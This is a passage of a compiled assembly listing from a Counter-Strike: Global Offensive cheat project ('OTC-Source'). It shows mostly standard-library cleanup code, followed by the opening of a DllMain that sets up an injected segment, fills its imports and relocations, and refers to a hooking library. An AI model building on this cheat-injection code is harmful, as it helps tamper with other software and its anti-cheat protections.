  00021	8b 4a e0	 mov	 ecx, DWORD PTR [edx-32]
  00024	33 c8		 xor	 ecx, eax
  00026	e8 00 00 00 00	 call	 @__security_check_cookie@4
  0002b	b8 00 00 00 00	 mov	 eax, OFFSET __ehfuncinfo$??0SegmentFramework@@QAE@ABV0@@Z
  00030	e9 00 00 00 00	 jmp	 ___CxxFrameHandler3
text$x	ENDS
??0SegmentFramework@@QAE@ABV0@@Z ENDP			; SegmentFramework::SegmentFramework
; Function compile flags: /Ogtp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
;	COMDAT ??1SegmentFramework@@QAE@XZ
_TEXT	SEGMENT
??1SegmentFramework@@QAE@XZ PROC			; SegmentFramework::~SegmentFramework, COMDAT
; _this$ = ecx
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1693 :         if (_Myfirst) { // destroy and deallocate old array

  00000	56		 push	 esi
  00001	8b f1		 mov	 esi, ecx
  00003	8b 46 18	 mov	 eax, DWORD PTR [esi+24]
  00006	85 c0		 test	 eax, eax
  00008	74 45		 je	 SHORT $LN6@SegmentFra

; 1694 :             _Destroy(_Myfirst, _Mylast);
; 1695 :             _Getal().deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

  0000a	8b 4e 20	 mov	 ecx, DWORD PTR [esi+32]
  0000d	2b c8		 sub	 ecx, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 780  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  0000f	83 e1 fc	 and	 ecx, -4			; fffffffcH

; 190  :     if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00012	81 f9 00 10 00
	00		 cmp	 ecx, 4096		; 00001000H
  00018	72 16		 jb	 SHORT $LN22@SegmentFra

; 111  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0001a	8b 50 fc	 mov	 edx, DWORD PTR [eax-4]
  0001d	83 c1 23	 add	 ecx, 35			; 00000023H

; 112  : 
; 113  :     // If the following asserts, it likely means that we are performing
; 114  :     // an aligned delete on memory coming from an unaligned allocation.
; 115  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 116  : 
; 117  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 118  :     // in range [_Min_back_shift, _Non_user_size]
; 119  : #ifdef _DEBUG
; 120  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 121  : #else // ^^^ _DEBUG ^^^ // vvv !_DEBUG vvv
; 122  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 123  : #endif // _DEBUG
; 124  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  00020	2b c2		 sub	 eax, edx

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00022	83 c0 fc	 add	 eax, -4			; fffffffcH
  00025	83 f8 1f	 cmp	 eax, 31			; 0000001fH
  00028	0f 87 b1 00 00
	00		 ja	 $LN68@SegmentFra

; 126  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0002e	8b c2		 mov	 eax, edx
$LN22@SegmentFra:

; 195  :     ::operator delete(_Ptr, _Bytes);

  00030	51		 push	 ecx
  00031	50		 push	 eax
  00032	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1697 :             _Myfirst = pointer();

  00037	c7 46 18 00 00
	00 00		 mov	 DWORD PTR [esi+24], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 195  :     ::operator delete(_Ptr, _Bytes);

  0003e	83 c4 08	 add	 esp, 8
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1698 :             _Mylast  = pointer();

  00041	c7 46 1c 00 00
	00 00		 mov	 DWORD PTR [esi+28], 0

; 1699 :             _Myend   = pointer();

  00048	c7 46 20 00 00
	00 00		 mov	 DWORD PTR [esi+32], 0
$LN6@SegmentFra:

; 1693 :         if (_Myfirst) { // destroy and deallocate old array

  0004f	8b 46 0c	 mov	 eax, DWORD PTR [esi+12]
  00052	85 c0		 test	 eax, eax
  00054	74 41		 je	 SHORT $LN31@SegmentFra

; 1694 :             _Destroy(_Myfirst, _Mylast);
; 1695 :             _Getal().deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

  00056	8b 4e 14	 mov	 ecx, DWORD PTR [esi+20]
  00059	2b c8		 sub	 ecx, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 780  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  0005b	83 e1 fc	 and	 ecx, -4			; fffffffcH

; 190  :     if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0005e	81 f9 00 10 00
	00		 cmp	 ecx, 4096		; 00001000H
  00064	72 12		 jb	 SHORT $LN47@SegmentFra

; 111  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00066	8b 50 fc	 mov	 edx, DWORD PTR [eax-4]
  00069	83 c1 23	 add	 ecx, 35			; 00000023H

; 112  : 
; 113  :     // If the following asserts, it likely means that we are performing
; 114  :     // an aligned delete on memory coming from an unaligned allocation.
; 115  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 116  : 
; 117  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 118  :     // in range [_Min_back_shift, _Non_user_size]
; 119  : #ifdef _DEBUG
; 120  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 121  : #else // ^^^ _DEBUG ^^^ // vvv !_DEBUG vvv
; 122  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 123  : #endif // _DEBUG
; 124  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  0006c	2b c2		 sub	 eax, edx

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  0006e	83 c0 fc	 add	 eax, -4			; fffffffcH
  00071	83 f8 1f	 cmp	 eax, 31			; 0000001fH
  00074	77 69		 ja	 SHORT $LN68@SegmentFra

; 126  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  00076	8b c2		 mov	 eax, edx
$LN47@SegmentFra:

; 195  :     ::operator delete(_Ptr, _Bytes);

  00078	51		 push	 ecx
  00079	50		 push	 eax
  0007a	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1697 :             _Myfirst = pointer();

  0007f	c7 46 0c 00 00
	00 00		 mov	 DWORD PTR [esi+12], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 195  :     ::operator delete(_Ptr, _Bytes);

  00086	83 c4 08	 add	 esp, 8
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1698 :             _Mylast  = pointer();

  00089	c7 46 10 00 00
	00 00		 mov	 DWORD PTR [esi+16], 0

; 1699 :             _Myend   = pointer();

  00090	c7 46 14 00 00
	00 00		 mov	 DWORD PTR [esi+20], 0
$LN31@SegmentFra:

; 1693 :         if (_Myfirst) { // destroy and deallocate old array

  00097	8b 06		 mov	 eax, DWORD PTR [esi]
  00099	85 c0		 test	 eax, eax
  0009b	74 40		 je	 SHORT $LN55@SegmentFra

; 1694 :             _Destroy(_Myfirst, _Mylast);
; 1695 :             _Getal().deallocate(_Myfirst, static_cast<size_type>(_Myend - _Myfirst));

  0009d	8b 4e 08	 mov	 ecx, DWORD PTR [esi+8]
  000a0	2b c8		 sub	 ecx, eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 780  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  000a2	83 e1 f8	 and	 ecx, -8			; fffffff8H

; 190  :     if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  000a5	81 f9 00 10 00
	00		 cmp	 ecx, 4096		; 00001000H
  000ab	72 12		 jb	 SHORT $LN71@SegmentFra

; 111  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  000ad	8b 50 fc	 mov	 edx, DWORD PTR [eax-4]
  000b0	83 c1 23	 add	 ecx, 35			; 00000023H

; 112  : 
; 113  :     // If the following asserts, it likely means that we are performing
; 114  :     // an aligned delete on memory coming from an unaligned allocation.
; 115  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 116  : 
; 117  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 118  :     // in range [_Min_back_shift, _Non_user_size]
; 119  : #ifdef _DEBUG
; 120  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 121  : #else // ^^^ _DEBUG ^^^ // vvv !_DEBUG vvv
; 122  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 123  : #endif // _DEBUG
; 124  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  000b3	2b c2		 sub	 eax, edx

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  000b5	83 c0 fc	 add	 eax, -4			; fffffffcH
  000b8	83 f8 1f	 cmp	 eax, 31			; 0000001fH
  000bb	77 22		 ja	 SHORT $LN68@SegmentFra

; 126  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  000bd	8b c2		 mov	 eax, edx
$LN71@SegmentFra:

; 195  :     ::operator delete(_Ptr, _Bytes);

  000bf	51		 push	 ecx
  000c0	50		 push	 eax
  000c1	e8 00 00 00 00	 call	 ??3@YAXPAXI@Z		; operator delete
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1697 :             _Myfirst = pointer();

  000c6	c7 06 00 00 00
	00		 mov	 DWORD PTR [esi], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 195  :     ::operator delete(_Ptr, _Bytes);

  000cc	83 c4 08	 add	 esp, 8
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 1698 :             _Mylast  = pointer();

  000cf	c7 46 04 00 00
	00 00		 mov	 DWORD PTR [esi+4], 0

; 1699 :             _Myend   = pointer();

  000d6	c7 46 08 00 00
	00 00		 mov	 DWORD PTR [esi+8], 0
$LN55@SegmentFra:
  000dd	5e		 pop	 esi
  000de	c3		 ret	 0
$LN68@SegmentFra:
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 125  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  000df	ff 15 00 00 00
	00		 call	 DWORD PTR __imp___invalid_parameter_noinfo_noreturn
$LN76@SegmentFra:
  000e5	cc		 int	 3
??1SegmentFramework@@QAE@XZ ENDP			; SegmentFramework::~SegmentFramework
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\runtime\RuntimeHandler.h
;	COMDAT ??0RuntimeHandler@@QAE@AAVSegment@@@Z
_TEXT	SEGMENT
_segment$ = 8						; size = 4
??0RuntimeHandler@@QAE@AAVSegment@@@Z PROC		; RuntimeHandler::RuntimeHandler, COMDAT
; _this$ = ecx

; 9    :     RuntimeHandler (Segment& segment) : m_Segment (segment) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	8b 45 08	 mov	 eax, DWORD PTR _segment$[ebp]
  00006	89 01		 mov	 DWORD PTR [ecx], eax
  00008	8b c1		 mov	 eax, ecx
  0000a	5d		 pop	 ebp
  0000b	c2 04 00	 ret	 4
??0RuntimeHandler@@QAE@AAVSegment@@@Z ENDP		; RuntimeHandler::RuntimeHandler
_TEXT	ENDS
; Function compile flags: /Ogtp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\runtime\RuntimeHandler.h
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\Utils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\libs\libs\HookLib\HookLib\HookLib\HookLib.c
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\libs\libs\HookLib\HookLib\HookLib\HookLib.c
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\Segment.h
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\Utils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\Segment.h
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\Utils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\RuntimeHandler.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\SegmentFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\runtime\Logger.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\frameworks\GameFramework.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\cpp\utils\PanicUtils.cpp
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp
;	COMDAT _DllMain@12
_TEXT	SEGMENT
$T32 = -436						; size = 36
$T28 = -436						; size = 36
$T24 = -436						; size = 36
$T22 = -436						; size = 36
$T19 = -436						; size = 36
$T18 = -436						; size = 36
_this$ = -400						; size = 4
_runtime$37 = -400					; size = 4
_osVersionInfo$38 = -396				; size = 284
_osVersionInfo$39 = -388				; size = 276
_segment$40 = -112					; size = 56
_logger$41 = -56					; size = 24
_watermark$42 = -32					; size = 16
_watermark$43 = -28					; size = 12
__$ArrayPad$ = -16					; size = 4
__$EHRec$ = -12						; size = 12
_module$ = 8						; size = 4
_callReason$ = 12					; size = 4
_lpReserved$ = 16					; size = 4
_DllMain@12 PROC					; COMDAT

; 25   : BOOL APIENTRY DllMain (HMODULE module, DWORD callReason, LPVOID lpReserved) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	6a ff		 push	 -1
  00005	68 00 00 00 00	 push	 __ehhandler$_DllMain@12
  0000a	64 a1 00 00 00
	00		 mov	 eax, DWORD PTR fs:0
  00010	50		 push	 eax
  00011	81 ec ac 01 00
	00		 sub	 esp, 428		; 000001acH
  00017	a1 00 00 00 00	 mov	 eax, DWORD PTR ___security_cookie
  0001c	33 c5		 xor	 eax, ebp
  0001e	89 45 f0	 mov	 DWORD PTR __$ArrayPad$[ebp], eax
  00021	56		 push	 esi
  00022	57		 push	 edi
  00023	50		 push	 eax
  00024	8d 45 f4	 lea	 eax, DWORD PTR __$EHRec$[ebp]
  00027	64 a3 00 00 00
	00		 mov	 DWORD PTR fs:0, eax

; 26   : 
; 27   :     //ALL DOCS INSIDE FUNCTIONS, AND HEADERS.
; 28   : 
; 29   :     if (callReason == DLL_PROCESS_ATTACH) {

  0002d	83 7d 0c 01	 cmp	 DWORD PTR _callReason$[ebp], 1
  00031	0f 85 c8 05 00
	00		 jne	 $LN255@DllMain
  00037	6a 38		 push	 56			; 00000038H
  00039	8d 45 90	 lea	 eax, DWORD PTR _segment$40[ebp]
  0003c	6a 00		 push	 0
  0003e	50		 push	 eax
  0003f	e8 00 00 00 00	 call	 _memset
  00044	8d 45 90	 lea	 eax, DWORD PTR _segment$40[ebp]
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  00047	c7 45 90 00 00
	00 00		 mov	 DWORD PTR _segment$40[ebp], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  0004e	6a 20		 push	 32			; 00000020H
  00050	89 85 70 fe ff
	ff		 mov	 DWORD PTR _this$[ebp], eax
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 435  :     _Tree_val() noexcept : _Myhead(), _Mysize(0) {}

  00056	c7 45 94 00 00
	00 00		 mov	 DWORD PTR _segment$40[ebp+4], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xmemory

; 51   :         return ::operator new(_Bytes);

  0005d	e8 00 00 00 00	 call	 ??2@YAPAXI@Z		; operator new
  00062	83 c4 10	 add	 esp, 16			; 00000010H
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\xtree

; 344  :         _Construct_in_place(_Pnode->_Left, _Pnode);

  00065	89 00		 mov	 DWORD PTR [eax], eax

; 345  :         _Construct_in_place(_Pnode->_Parent, _Pnode);

  00067	89 40 04	 mov	 DWORD PTR [eax+4], eax

; 346  :         _Construct_in_place(_Pnode->_Right, _Pnode);

  0006a	89 40 08	 mov	 DWORD PTR [eax+8], eax

; 347  :         _Pnode->_Color = _Black;

  0006d	66 c7 40 0c 01
	01		 mov	 WORD PTR [eax+12], 257	; 00000101H

; 2024 :         _Scary->_Myhead = _Node::_Buyheadnode(_Getal());

  00073	89 45 90	 mov	 DWORD PTR _segment$40[ebp], eax
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h

; 50   :     SegmentHeader () {

  00076	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 0
; File C:\Program Files (x86)\Visual Studio IDE\VC\Tools\MSVC\14.26.28801\include\vector

; 374  :     _Vector_val() noexcept : _Myfirst(), _Mylast(), _Myend() {}

  0007d	c7 45 98 00 00
	00 00		 mov	 DWORD PTR _segment$40[ebp+8], 0
  00084	c7 45 9c 00 00
	00 00		 mov	 DWORD PTR _segment$40[ebp+12], 0
  0008b	c7 45 a0 00 00
	00 00		 mov	 DWORD PTR _segment$40[ebp+16], 0
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\headers\segment\SegmentHeader.h

; 51   :         FillImports ();

  00092	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  00095	c6 45 fc 01	 mov	 BYTE PTR __$EHRec$[ebp+8], 1
  00099	e8 00 00 00 00	 call	 ?FillImports@SegmentHeader@@AAEXXZ ; SegmentHeader::FillImports

; 52   :         FillRelocations ();

  0009e	8d 4d 90	 lea	 ecx, DWORD PTR _segment$40[ebp]
  000a1	e8 00 00 00 00	 call	 ?FillRelocations@SegmentHeader@@AAEXXZ ; SegmentHeader::FillRelocations
  000a6	8d 4d a4	 lea	 ecx, DWORD PTR _segment$40[ebp+20]
  000a9	c7 45 fc 02 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 2
  000b0	e8 00 00 00 00	 call	 ??0SegmentFramework@@QAE@XZ
; File C:\Users\Neonik\Desktop\CSGO Cheat Sources\OTC-Source\otc\dllmain.cpp

; 31   :         Segment segment;

  000b5	0f 57 c0	 xorps	 xmm0, xmm0
  000b8	c7 45 fc 03 00
	00 00		 mov	 DWORD PTR __$EHRec$[ebp+8], 3

; 32   :         Logger logger (Logger::LoggerType::CONSOLE);

  000bf	6a 00		 push	 0
  000c1	8d 4d c8	 lea	 ecx, DWORD PTR _logger$41[ebp]
